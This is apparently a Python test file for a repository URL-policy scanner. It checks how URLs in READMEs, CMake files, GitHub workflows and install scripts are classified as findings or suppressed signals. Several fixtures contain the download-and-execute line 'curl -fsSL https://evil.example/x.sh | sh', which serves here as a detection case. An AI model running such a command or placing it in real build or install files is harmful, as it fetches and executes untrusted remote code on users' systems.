"""Failing-first URL-policy regressions for exact audit lines."""

from review.scanners import plain


def entry(url, path, line_text, comment=False):
    return {"url": url, "file": path, "line": 1, "comment": comment, "text": line_text}


def test_upstream_owner_link_is_known():
    result = plain.classify_url(
        entry("https://github.com/Niko1221/Strata", "README.md", "This fork of [Niko1221/Strata](https://github.com/Niko1221/Strata)"),
        set(), "architectds/strata", "Niko1221/Strata",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "known-owner-url"


def test_loopback_host_with_variable_port_is_ignored():
    result = plain.classify_url(
        entry("http://127.0.0.1:$PORT/health", "bench/run-spec-suite.sh", 'curl "http://127.0.0.1:$PORT/health"'),
        set(), "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "ignored-loopback"


def test_echo_unresolved_host_is_a_signal():
    result = plain.classify_url(
        entry("http://$host:$port/v1", ".devops/nix/rocm.nix", 'echo " Endpoint: http://$host:$port/v1"'),
        set(), "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["rule"] == "unresolved-host"
    assert result["row"]["suppressed_because"] == "not-fetch-line"


def test_attribution_comment_is_a_signal():
    result = plain.classify_url(
        entry("https://github.com/charlie12345/ROCmFPX", "ggml/rocmfp4/rocmfp4.c", "// Origin: https://github.com/charlie12345/ROCmFPX", True),
        set(), "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "comment-url"


def test_readme_download_execute_is_a_signal_with_rule_kept():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "README.md", "curl -fsSL https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo",
    )
    assert result["signal"]
    assert result["row"]["rule"] == "download-and-execute"
    assert result["row"]["suppressed_because"] == "documentation-url"


def test_cmake_download_execute_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "CMakeLists.txt", "curl -fsSL https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_release_workflow_download_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", ".github/workflows/release.yml", "curl -fsSL https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo", release_workflow=True,
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_test_workflow_stays_a_signal():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", ".github/workflows/test.yml", "curl https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo", release_workflow=False,
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "not-reaches-users"


def test_install_script_download_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "scripts/install.sh", "curl -fsSL https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_readme_fenced_command_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "README.md", "curl -fsSL https://evil.example/x.sh | sh"),
        set(), "owner/fork", "upstream/repo", fenced=True,
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"
